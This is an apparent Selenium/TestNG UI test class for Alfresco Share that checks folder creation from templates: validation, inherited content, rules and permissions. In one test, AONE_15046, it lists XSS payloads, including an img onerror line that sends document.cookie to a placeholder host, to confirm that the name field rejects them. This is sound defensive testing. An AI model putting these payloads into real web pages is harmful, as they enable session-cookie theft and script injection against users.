package org.alfresco.share.site.document;

import org.alfresco.po.share.RepositoryPage;
import org.alfresco.po.share.enums.UserRole;
import org.alfresco.po.share.site.NewFolderPage;
import org.alfresco.po.share.site.contentrule.FolderRulesPage;
import org.alfresco.po.share.site.contentrule.FolderRulesPageWithRules;
import org.alfresco.po.share.site.contentrule.createrules.CreateRulePage;
import org.alfresco.po.share.site.contentrule.createrules.selectors.AbstractIfSelector;
import org.alfresco.po.share.site.contentrule.createrules.selectors.impl.ActionSelectorEnterpImpl;
import org.alfresco.po.share.site.contentrule.createrules.selectors.impl.WhenSelectorImpl;
import org.alfresco.po.share.site.document.*;
import org.alfresco.share.util.*;
import org.alfresco.share.util.api.CreateUserAPI;
import org.alfresco.webdrone.testng.listener.FailedTestListener;
import org.apache.log4j.Logger;
import org.openqa.selenium.WebElement;
import org.testng.Assert;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;

import java.util.List;

import static org.alfresco.share.util.ShareUser.openSiteDashboard;
import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertFalse;
import static org.testng.Assert.assertTrue;

/**
 * @author Maryia Zaichanka
 */

@Listeners(FailedTestListener.class)
public class FolderTemplateCreationTest extends AbstractUtils
{
    private static final Logger logger = Logger.getLogger(FolderTemplateCreationTest.class);
    private String folderName = "Folder" + "template";
    private String[] folderPath = { "Data Dictionary", "Space Templates" };

    private void deleteTemplates ()
    {



            ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
            ShareUserRepositoryPage.openRepository(drone);
            RepositoryPage repositoryPage = ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
            List<FileDirectoryInfo>items = repositoryPage.getFiles();

            int i = items.size();

            for (int k=1; k<=i; k++)
            {
                repositoryPage.deleteItem(1);
                drone.getCurrentPage().render();
            }
    }


    @Override
    @BeforeClass(alwaysRun = true)
    public void setup() throws Exception
    {

        super.setup();
        testName = this.getClass().getSimpleName();
        logger.info("Starting Tests: " + testName);
    }


    @AfterMethod(groups = { "EnterpriseOnly" })
    public void quit() throws Exception
    {
        // Logout as created user
        try
        {
            ShareUser.logout(drone);
            logger.info("Toolbar user logged out - drone.");
        }
        catch (Throwable e)
        {
            reportError(drone, testName, e);
        }

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15032() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" })
    public void AONE_15032() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);


        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu: Verify the available actions
        DocumentLibraryNavigation docLib = documentLibraryPage.getNavigation().render();
        docLib.selectCreateContentDropdown().render();

        assertTrue(docLib.isCreateFromTemplatePresent(true), "The FOLDER component isn't present");

        // Navigate to My Files. Verify the actions in Create menu
        MyFilesPage myFiles = docLib.getNav().selectMyFilesPage().render();
        myFiles.getNavigation().selectCreateContentDropdown().render();

        assertTrue(myFiles.getNavigation().isCreateFromTemplatePresent(true), "The FOLDER component isn't present");


    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15033() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15048", alwaysRun = true)
    public void AONE_15033() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String emptyTemplate = "Empty";

        deleteTemplates();

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        DocumentLibraryNavigation docLib = documentLibraryPage.getNavigation().render();

        docLib.selectCreateFolderFromTemplateHover();
        List<WebElement> templates = documentLibraryPage.getTemplateList();
        assertTrue(templates.get(0).getText().contains(emptyTemplate), "Template List isn't empty");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15034() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String[] folderPath = { "Data Dictionary", "Space Templates" };

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 0, folderName + 0);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15032", alwaysRun = true)
    public void AONE_15034() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        ShareUser.openSitesDocumentLibrary(drone, siteName).render();
        documentLibraryPage.createFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 0), "Folder isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15035() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String[] folderPath = { "Data Dictionary", "Space Templates" };

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 1, folderName + 1);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15034", alwaysRun = true)
    public void AONE_15035() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);


        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        MyFilesPage myFiles = documentLibraryPage.getNav().selectMyFilesPage().render();
        myFiles.createFolderFromTemplateHover(folderName + 1).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 1), "Folder isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15036() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15035", alwaysRun = true)
    public void AONE_15036() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        DocumentLibraryNavigation docLib = documentLibraryPage.getNavigation().render();

        docLib.selectCreateFolderFromTemplateHover();
        List<WebElement> templates = documentLibraryPage.getTemplateList();
        assertTrue(templates.size()>0, "List of templates isn't present");
        documentLibraryPage.getNavigation().selectCreateContentDropdown();

        // Select any template. Fill in the required fields and create the folder
        documentLibraryPage.createFolderFromTemplateHover(folderName + 1).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 1), "Folder isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15037() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15036", alwaysRun = true)
    public void AONE_15037() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select any template. Fill in a name field with a new name and create a folder
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        newFolder.typeName(folderName + 2);
        newFolder.selectSubmitButton();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 2), "Folder isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15038() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15037", alwaysRun = true)
    public void AONE_15038() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String wildcardsWrong = "*\".<>/\\|?:";
        String wildcards = "`~!^@#$№;,%()_&-{}[]'";

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select any template. Type into "Name" field special symbols (such as *".<>/\|?:)
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        newFolder.typeName(wildcardsWrong);

        assertEquals(newFolder.getMessage(NewFolderPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"),
                "Friendly notification isn't present");


        // Clear "Name" field and type into this special symbols (such as `~!^@#$№;,%()_&-{}[]')
        newFolder.typeName(wildcards);
        assertFalse(newFolder.getMessage(NewFolderPage.Fields.NAME).length() > 0);

        // Type into "Description" and "Title" special symbols (such as `~!^@#$№;,%()_&-{}[]':*".<>/\|?) and create the folder
        newFolder.typeDescription(wildcards + wildcardsWrong);
        newFolder.selectSubmitButton();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(wildcards), "Folder isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15039() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String contentName = "cont" + getFileName(testName) + ".txt";
        String[] folderPath = { "Data Dictionary", "Space Templates" };
        String[] contentFolderPath = { "Data Dictionary", "Space Templates", folderName + 2 };

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 2, folderName + 2);

        // Upload file
        ShareUserRepositoryPage.openRepositorySimpleView(drone);
        ContentDetails contentDetails = new ContentDetails();
        contentDetails.setName(contentName);
        contentDetails.setContent(contentName);
        ShareUserRepositoryPage.createContentInFolder(drone, contentDetails, ContentType.PLAINTEXT, contentFolderPath);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15038", alwaysRun = true)
    public void AONE_15039() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String contentName = "cont" + getFileName(testName) + ".txt";

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        ShareUser.openSitesDocumentLibrary(drone, siteName).render();
        documentLibraryPage.createFolderFromTemplateHover(folderName + 2).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 2), "Folder isn't created");

        // Verify the the created folder contains the content such as the template have
        FileDirectoryInfo fileDirectory = ShareUserSitePage.getFileDirectoryInfo(drone, folderName + 2);
        fileDirectory.clickOnTitle();
        assertTrue(documentLibraryPage.isFileVisible(contentName), "Document isn't created");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15040() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String[] folderPath = { "Data Dictionary", "Space Templates" };


        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 3, folderName + 3);

        // create the rule for folder
        FileDirectoryInfo fileDirectory = ShareUserSitePage.getFileDirectoryInfo(drone, folderName + 3);
        FolderRulesPage folderRulesPage = fileDirectory.selectManageRules().render();
        Assert.assertTrue(folderRulesPage.isPageCorrect(folderName + 3), "Rule page isn't correct");

        // Fill "Name" field with correct data
        CreateRulePage createRulePage = folderRulesPage.openCreateRulePage().render();
        createRulePage.fillNameField("Remove Aspect Rule Name");

        // Select "Inbound" value from "When" drop-down select control
        WhenSelectorImpl whenSelectorIml = createRulePage.getWhenOptionObj();
        whenSelectorIml.selectInbound();

        // Select 'All items' from "If" drop-down select control
        AbstractIfSelector ifSelector = createRulePage.getIfOptionObj();
        ifSelector.selectIFOption(0);

        // Select Remove an aspect" from "Perform Action" drop-down select control
        // Select 'Classifiable' from drop-down select control
        ActionSelectorEnterpImpl actionSelectorEnterpImpl = createRulePage.getActionOptionsObj();
        actionSelectorEnterpImpl.selectRemoveAspect(DocumentAspect.CLASSIFIABLE.getValue());

        // Click "Create" button
        FolderRulesPageWithRules folderRulesPageWithRules = createRulePage.clickCreate().render();
        Assert.assertTrue(folderRulesPageWithRules.isPageCorrect(folderName + 3), "Rule page with rule isn't correct");

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15039", alwaysRun = true)
    public void AONE_15040() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        ShareUser.openSitesDocumentLibrary(drone, siteName).render();
        documentLibraryPage.createFolderFromTemplateHover(folderName + 3).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 3), "Folder isn't created");

        // Verify the the created folder contains the rule such as the template have
        FileDirectoryInfo fileDirectory = ShareUserSitePage.getFileDirectoryInfo(drone, folderName + 3);
        FolderRulesPageWithRules folderRulesPage = fileDirectory.selectManageRules().render();
        Assert.assertTrue(folderRulesPage.isRuleNameDisplayed("Remove Aspect Rule Name"), "Rule page isn't correct");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15041() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 6, folderName + 6);

        // Navigate the document's manage permission.
        ShareUser.returnManagePermissionPage(drone, folderName + 6);

        // Add created user in permission with "Collaborator".
        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser, true, UserRole.COLLABORATOR, true);

        // Create Site
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15040", alwaysRun = true)
    public void AONE_15041() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        documentLibraryPage.createFolderFromTemplateHover(folderName + 6).render();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(folderName + 6), "Folder isn't created");

        ShareUser.returnManagePermissionPage(drone, folderName + 6);
        ManagePermissionsPage managePermissionsPage = drone.getCurrentPage().render();
        UserRole role = managePermissionsPage.getExistingPermission(testUser);
        Assert.assertEquals(role, UserRole.COLLABORATOR, "The permissions aren't set for the created folder");
    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15044() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15041", alwaysRun = true)
    public void AONE_15044() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String notification = "The value cannot be empty.";
        String description = getRandomString(5);


        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select any template. Leave name field empty
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        newFolder.type("");
        newFolder.typeDescription(description);
        newFolder.type("");

        assertEquals(newFolder.getMessage(NewFolderPage.Fields.NAME), notification, "Friendly notification isn't present");

    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15045() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15044", alwaysRun = true)
    public void AONE_15045() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String name = getRandomString(255);
        String description = getRandomString(255) + " " + getRandomString(255) + " " + getRandomString(5);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        // Select any template. Type into "Name" field 255 symbols with spaces
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 1).render();
        drone.getCurrentPage().render();
        newFolder.typeName(name);

        assertFalse(newFolder.getMessage(NewFolderPage.Fields.NAME).length() > 0, "Friendly notification is present");


        // Type into "Description" and "Title" more than 512 symbols with space
        newFolder.typeTitle(description);
        newFolder.typeDescription(description);

        assertFalse(newFolder.getMessage(NewFolderPage.Fields.NAME).length() > 0, "Friendly notification is present");

        // Create folder
        newFolder.selectSubmitButton();
        drone.getCurrentPage().render();
        assertTrue(documentLibraryPage.isFileVisible(name), "Folder isn't created");
    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15046() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15045", alwaysRun = true)
    public void AONE_15046() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String[] xss = {"<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">", "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">",
        "<DIV STYLE=\"width: expression(alert('XSS'));\">", "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">", "<img><scrip<script>t>alert('XSS');<</script>/script>"};

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select any template. Fill in a name field with a duplicate name and create a folder
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        for (String s : xss)
        {
            newFolder.typeName(s);
            assertEquals(newFolder.getMessage(NewFolderPage.Fields.NAME), drone.getValue("message.value.contains.illegal.characters"),
                    "Friendly notification isn't present");

        }
    }

    @Test(groups = { "DataPrepEnterpriseOnly" })
    public void dataPrep_AONE_15047() throws Exception
    {

        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String folder = getFolderName(testName);

        // Create user
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUser);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);
        ShareUser.createFolderInFolder(drone, folder, "", DOCLIB);

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15046", alwaysRun = true)
    public void AONE_15047() throws Exception
    {
        String testName = getTestName();
        String testUser = getUserNameFreeDomain(testName);
        String siteName = getSiteName(testName);
        String folder = getFolderName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select any template. Fill in a name field with a duplicate name and create a folder
        NewFolderPage newFolder = documentLibraryPage.openFolderFromTemplateHover(folderName + 0).render();
        drone.getCurrentPage().render();
        newFolder.typeName(folder);
        newFolder.selectSubmitButton();
        drone.getCurrentPage().render();
        String notification = newFolder.getNotificationMessage();
        assertTrue(notification.contains("Duplicate folder name"), "Friendly notification isn't present");

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15049", alwaysRun = true)
    public void AONE_15048() throws Exception
    {
        String testName = getTestName();
        String siteName = getSiteName(testName);
        String[] folderPath = { "Data Dictionary", "Space Templates" };

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

        deleteTemplates();

        // Upload template folder
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 4, folderName + 4);

        ShareUser.openUserDashboard(drone);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();

        // Select the Create menu > Create folder from templates
        DocumentLibraryNavigation docLib = documentLibraryPage.getNavigation().render();

        docLib.selectCreateFolderFromTemplateHover();
        List<WebElement> templates = documentLibraryPage.getTemplateList();
        assertTrue(templates.get(0).getText().contains(folderName + 4), "Template isn't present in a list");

        ShareUserRepositoryPage.openRepository(drone);
        RepositoryPage repositoryPage = ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        repositoryPage.deleteItem(folderName + 4).render();

        openSiteDashboard(drone,siteName);
        ShareUser.openDocumentLibrary(drone).render();
        docLib = documentLibraryPage.getNavigation().render();
        docLib.selectCreateFolderFromTemplateHover();
        templates = documentLibraryPage.getTemplateList();
        assertFalse(templates.get(0).getText().contains(folderName + 4), "Template is present in a list");

    }

    @Test(groups = { "EnterpriseOnly" }, dependsOnMethods = "AONE_15047", alwaysRun = true)
    public void AONE_15049() throws Exception
    {
        String testName = getTestName();
        String siteName = getSiteName(testName);
        String[] folderPath = { "Data Dictionary", "Space Templates" };

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);
        ShareUser.createSite(drone, siteName, SITE_VISIBILITY_PUBLIC);

        ShareUserRepositoryPage.openRepositorySimpleView(drone);

        // Upload template folder
        ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        ShareUserRepositoryPage.createFolderInRepository(drone, folderName + 5, folderName + 5);
        ShareUser.openUserDashboard(drone);
        openSiteDashboard(drone, siteName);
        DocumentLibraryPage documentLibraryPage = ShareUser.openDocumentLibrary(drone).render();
        String url = shareUrl + "/page" + "/repository";

        // Select the Create menu > Create folder from templates
        DocumentLibraryNavigation docLib = documentLibraryPage.getNavigation().render();

        docLib.selectCreateFolderFromTemplateHover();
        WebElement template = documentLibraryPage.getTemplate(folderName + 5);
        template.click();
        NewFolderPage newFolder = drone.getCurrentPage().render();

        // Navigate to Data Dictionary/Space Templates and delete the Template
        drone.createNewTab();
        drone.navigateTo(url);

        RepositoryPage repositoryPage = ShareUserRepositoryPage.navigateFoldersInRepositoryPage(drone, folderPath);
        repositoryPage.deleteItem(folderName + 5).render();
        drone.closeTab();

        newFolder.selectSubmitButton();
        String notification = newFolder.getNotificationMessage();
        assertTrue(notification.contains("Duplicate folder name"), "Friendly notification isn't present");

    }
}
